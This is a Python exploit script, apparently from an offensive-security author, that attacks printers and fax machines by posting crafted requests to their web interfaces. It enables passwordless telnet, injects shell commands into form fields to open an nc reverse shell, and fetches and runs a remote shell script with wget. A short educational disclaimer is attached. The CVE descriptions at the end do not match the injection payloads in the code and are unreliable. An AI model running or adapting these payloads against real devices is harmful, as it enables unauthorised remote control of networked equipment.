import argparse
import requests

# Developer: SirCryptic (NullSecurityTeam)
# Info: Faxploit PoC
# The author of this script is not responsible for any damage caused by the use or misuse of this script. 
# These PoCs are intended for educational and research purposes only, and should never be used to target or exploit systems without explicit permission from the owner.

# CVE-2018-16741 exploit function
def exploit_cve_2018_16741(target, listen):
    url = f'http://{target}/telnetCfg.cgi'
    payload = {'telnetEn': '1',
               'loginStatus': '0',
               'telnetPort': '23',
               'telnetTimeout': '1'}
    requests.post(url, data=payload)

# CVE-2012-0992 exploit function
def exploit_cve_2012_0992(target, listen):
    url = f'http://{target}/telformset.htm'
    payload = {'ConfigunLock': '1',
               'NtpServer': f'{listen};nc {listen} 4444 -e /bin/bash'}
    requests.post(url, data=payload)

# CVE-2006-3126 exploit function
def exploit_cve_2006_3126(target, listen, file_path):
    url = f'http://{target}/apply.cgi'
    payload = {'submit_button': 'Diagnostic',
               'change_action': 'gozila_cgi',
               'submit_type': 'start_ping',
               'ip_addr': f'`/bin/busybox wget {file_path} -O /tmp/reverse_shell.sh; chmod +x /tmp/reverse_shell.sh; /tmp/reverse_shell.sh | nc {listen} 4444`'}
    requests.post(url, data=payload)

# command-line arguments
parser = argparse.ArgumentParser()
parser.add_argument('-t', '--target', required=True, help='target IP address')
parser.add_argument('-l', '--listen', required=True, help='listening IP address')
parser.add_argument('-cve1', '--cve-2018-16741', action='store_true', help='test for CVE-2018-16741')
parser.add_argument('-cve2', '--cve-2012-0992', action='store_true', help='test for CVE-2012-0992')
parser.add_argument('-cve3', '--cve-2006-3126', action='store_true', help='test for CVE-2006-3126')
parser.add_argument('-f', '--file-path', help='path of file to be sent to target')
args = parser.parse_args()

# exploit fax machine for selected CVEs
target_ip = args.target
listen_ip = args.listen

if args.cve_2018_16741:
    exploit_cve_2018_16741(target_ip, listen_ip)

if args.cve_2012_0992:
    exploit_cve_2012_0992(target_ip, listen_ip)

if args.cve_2006_3126:
    file_path = args.file_path
    exploit_cve_2006_3126(target_ip, listen_ip, file_path)
    
    # Example Usage:
    # python3 faxploit.py -t <target_ip> -l <listen_ip> -cve1
    # python3 faxploit.py -t <target_ip> -l <listen_ip> -cve3 -f /path/to/file/on/attacker
    
    # Based on Known vulnerabilities. 
    # CVE-2018-16741: a vulnerability found in certain HP OfficeJet printers that allows an attacker to enable telnet service with an empty password.
    # CVE-2012-0992: a vulnerability found in certain HP LaserJet printers that allows an attacker to execute arbitrary code by sending a specially crafted firmware update file.
    # CVE-2006-3126: a vulnerability found in certain HP OfficeJet printers that allows an attacker to execute arbitrary code by sending a specially crafted fax message.
